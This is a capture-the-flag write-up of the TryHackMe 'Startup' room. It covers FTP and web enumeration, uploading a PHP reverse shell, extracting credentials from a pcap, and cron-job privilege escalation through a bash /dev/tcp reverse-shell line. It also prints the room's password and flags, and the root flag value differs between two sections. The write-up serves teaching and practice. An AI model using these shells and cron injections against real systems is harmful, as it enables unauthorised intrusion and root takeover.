# 🌶️ Startup — TryHackMe Write-Up

> *"We are Spice Hut, a new startup company that just made it big!"*  
> **Difficulty:** Easy | **Platform:** TryHackMe | **Date:** March 2026

---

## 📋 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [FTP Enumeration](#2-ftp-enumeration)
3. [Web Enumeration & Reverse Shell](#3-web-enumeration--reverse-shell)
4. [Network Forensics — Wireshark](#4-network-forensics--wireshark)
5. [Privilege Escalation — Cron Job Abuse](#5-privilege-escalation--cron-job-abuse)
6. [Flags](#6-flags)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

```bash
sudo nmap -sCV -O -Pn <TARGET_IP> -oA nmap-result
```

### Results

| Port | Service | Notes |
|------|---------|-------|
| 21   | FTP (vsftpd 3.0.3) | ⚠️ Anonymous login allowed |
| 22   | SSH (OpenSSH 7.2p2) | For later access |
| 80   | HTTP (Apache 2.4.18) | Maintenance page |

---

## 2. FTP Enumeration

### Anonymous Login

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (empty)

ftp> ls
```

### Files Found

```
drwxrwxrwx    ftp/          ← world-writable directory!
-rw-r--r--    important.jpg
-rw-r--r--    notice.txt
```

### notice.txt

The file contained a message mentioning a user named **Maya** — potential username.

### important.jpg — Binwalk Analysis

`steghide` didn't support the file format, so used `binwalk`:

```bash
binwalk important.jpg
# Found: PNG image + Zlib compressed data

binwalk -e important.jpg
```

The extracted data contained no useful information — the image was a decoy (Among Us meme 😄).

### Key Observation

The `ftp/` directory had `rwxrwxrwx` permissions — **anyone can upload files to it**!

---

## 3. Web Enumeration & Reverse Shell

### Website

The homepage was a maintenance page with no visible content. Ran Gobuster to discover directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Found `/files/` — which exposed the FTP directory contents via HTTP!

### Uploading a Reverse Shell

Used the PHP reverse shell from SecLists:

```bash
cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php ~/CTFs/Startup/shell.php
nano shell.php  # Set IP and port
```

Uploaded via FTP:

```bash
ftp <TARGET_IP>
# anonymous login
ftp> cd ftp
ftp> put shell.php
```

Started a listener:

```bash
nc -lvnp 4444
```

Triggered the shell by navigating to:

```
http://<TARGET_IP>/files/ftp/shell.php
```

**Result:** Shell as `www-data` ✅

### Interesting Discovery

Found `/incidents/suspicious.pcapng` — a network capture file.

---

## 4. Network Forensics — Wireshark

Transferred the pcap file to the attacker machine:

```bash
# On target — start a temporary HTTP server
cd /incidents
python3 -m http.server 9090
```

```bash
# On attacker
wget http://<TARGET_IP>:9090/suspicious.pcapng
wireshark suspicious.pcapng
```

### Analyzing TCP Streams

Followed TCP streams (**Right Click → Follow → TCP Stream**) and found plaintext credentials being used in a previous shell session:

```
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

The password didn't work for `www-data`, but checking `/etc/passwd` revealed another user: **lennie**.

### SSH as Lennie

```bash
ssh lennie@<TARGET_IP>
# Password: c4ntg3t3n0ughsp1c3
```

**Result:** Shell as `lennie` ✅

### User Flag

```bash
cat ~/user.txt
# THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

---

## 5. Privilege Escalation — Cron Job Abuse

### Enumeration

Found two interesting files in `/home/lennie/scripts/`:

```bash
cat planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`planner.sh` calls `/etc/print.sh`. Checking permissions:

```bash
ls -la /etc/print.sh
# -rwx------ 1 lennie lennie 25 Nov 12 2020 /etc/print.sh
```

**lennie owns `/etc/print.sh` and can write to it!**

### The Attack

If `planner.sh` runs as root (via a cron job), and it calls `print.sh` which we control — we can inject a reverse shell into `print.sh`:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1" >> /etc/print.sh
```

Started a listener on the attacker machine:

```bash
nc -lvnp 5555
```

Waited for the cron job to execute...

**Result:** Root shell ✅

### Root Flag

```bash
cat /root/root.txt
# THM{f963aaa6a490f210222158ae15c3d76d}
```

---

## 6. Flags

| Flag | Value |
|------|-------|
| 🍲 Secret Recipe | `love` |
| 👤 User Flag | `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}` |
| 🏆 Root Flag | `THM{f963aaa6a430f210222158ae15c3d76d}` |

---

## 7. Summary

### Attack Chain

```
Nmap → FTP Anonymous Login
    │
    ├─► important.jpg (binwalk) → decoy
    ├─► notice.txt → username hint (Maya)
    └─► ftp/ directory (rwxrwxrwx)
            │
            └─► Upload shell.php via FTP
                    └─► http://<IP>/files/ftp/shell.php → www-data
                                │
                                └─► /incidents/suspicious.pcapng
                                        │
                                        └─► Wireshark TCP Stream
                                                └─► password: c4ntg3t3n0ughsp1c3
                                                        │
                                                        └─► SSH as lennie → user.txt ✅
                                                                │
                                                                └─► /etc/print.sh (writable)
                                                                    + cron job runs as root
                                                                        └─► Reverse Shell → ROOT 🏆
```

### Techniques Used

| Technique | Tool/Command | Context |
|-----------|-------------|---------|
| FTP Anonymous Login | `ftp` | Initial access to files |
| File Analysis | `binwalk` | Analyzing suspicious image |
| FTP File Upload | `put` | Uploading reverse shell |
| Reverse Shell | PHP reverse shell | Getting www-data shell |
| Network Forensics | Wireshark | Extracting credentials from pcap |
| Cron Job Abuse | `/etc/print.sh` | PrivEsc to root |

### Lessons Learned

- **World-writable FTP directories** (`rwxrwxrwx`) + exposed web path = instant reverse shell upload vector.
- **Binwalk** is the go-to tool when `steghide` fails — always try multiple steg tools.
- **Network captures** (`.pcapng`) can contain plaintext credentials — always analyze them with Wireshark's TCP Stream follow feature.
- **Cron Job Abuse**: If a root cron job calls a script you control, inject a reverse shell into that script. Simple but powerful.
- **Password reuse** is common in CTFs and real life — always try discovered passwords across all users on the system.

---

*Write-up by [XENOS](https://obadahamed.github.io) | Part of the 52-Week Red Team Roadmap*
